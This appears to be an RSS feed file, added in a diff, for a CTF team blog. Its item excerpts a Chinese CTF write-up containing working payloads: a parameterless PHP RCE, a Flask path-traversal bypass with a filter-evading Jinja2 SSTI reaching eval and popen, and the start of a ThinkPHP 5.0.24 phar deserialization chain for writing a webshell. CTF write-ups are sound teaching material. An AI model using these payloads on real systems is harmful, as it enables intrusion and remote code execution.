@@ -1,0 +1,32 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>cazy on or4nge</title>
+    <link>https://or4ngesec.github.io/tags/cazy/</link>
+    <description>Recent content in cazy on or4nge</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Thu, 13 Jan 2022 13:23:41 +0800</lastBuildDate><atom:link href="https://or4ngesec.github.io/tags/cazy/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>长安战“疫” Writeup</title>
+      <link>https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/</link>
+      <pubDate>Thu, 13 Jan 2022 13:23:41 +0800</pubDate>
+      
+      <guid>https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/</guid>
+      <description>Web RCE_No_Para 无参数RCE，且过滤了部分函数。
+最终payload：
+?a=cat flag.php;&amp;amp;code=system(current(current(get_defined_vars()))); flask 查看网页源码
+&amp;lt;!--if not request.full_path.endswith(&amp;quot;.js?&amp;quot;): if not request.full_path.startswith(&amp;quot;/login&amp;quot;): return redirect(&amp;quot;login&amp;quot;)--&amp;gt; 要求路径是以/login开头，以.js?结尾，
+查看 flask 文档
+Requested path, including the query string.
+所以构造路径：
+/login/../admin?a=.js? 然后源码提示：
+&amp;lt;!--admin/?name=--&amp;gt; 使用以下路径发现是ssti
+/login/../admin?name={{7*7}}&amp;amp;a=.js? fuzz发现过滤了__，builtins，所以绕，最终payload
+/login/../admin?name={{config|attr(&#39;_&#39;+&#39;_init_&#39;+&#39;_&#39;)|attr(&#39;_&#39;+&#39;_globals_&#39;+&#39;_&#39;)|attr(&#39;_&#39;+&#39;_getitem_&#39;+&#39;_&#39;)(&#39;_&#39;+&#39;_buil&#39;+&#39;tins_&#39;+&#39;_&#39;)|attr(&#39;_&#39;+&#39;_getitem_&#39;+&#39;_&#39;)(&#39;eval&#39;)(&#39;_&#39;+&#39;_import_&#39;+&#39;_(&amp;quot;os&amp;quot;).popen(&amp;quot;cat /flag&amp;quot;).read()&#39;)}}&amp;amp;a=.js? tp 变量覆盖+phar反序列化+thinkphp 5.0.24反序列化写webshell
+生成phar文件
+&amp;lt;?php namespace think\process\pipes; class Windows { private $files = []; public function __construct() { $this-&amp;gt;files = [new \think\model\Merge]; } } namespace think\model; use think\Model; class Merge extends Model { protected $append = []; protected $error; public function __construct() { $this-&amp;gt;append = [ &amp;#39;bb&amp;#39; =&amp;gt; &amp;#39;getError&amp;#39; ]; $this-&amp;gt;error = (new \think\model\relation\BelongsTo); } } namespace think; class Model{} namespace think\console; class Output { protected $styles = []; private $handle = null; public function __construct() { $this-&amp;gt;styles = [&amp;#39;removeWhereField&amp;#39;]; $this-&amp;gt;handle = (new \think\session\driver\Memcache); } } namespace think\model\relation; class BelongsTo { protected $query; public function __construct() { $this-&amp;gt;query = (new \think\console\Output); } } namespace think\session\driver; class Memcache { protected $handler = null; public function __construct() { $this-&amp;gt;handler = (new \think\cache\driver\Memcached); } } namespace think\cache\driver; class File { protected $tag; protected $options = []; public function __construct() { $this-&amp;gt;tag = false; $this-&amp;gt;options = [ &amp;#39;expire&amp;#39; =&amp;gt; 3600, &amp;#39;cache_subdir&amp;#39; =&amp;gt; false, &amp;#39;prefix&amp;#39; =&amp;gt; &amp;#39;&amp;#39;, &amp;#39;data_compress&amp;#39; =&amp;gt; false, &amp;#39;path&amp;#39; =&amp;gt; &amp;#39;php://filter/convert.</description>
+    </item>
+    
+  </channel>
+</rss>
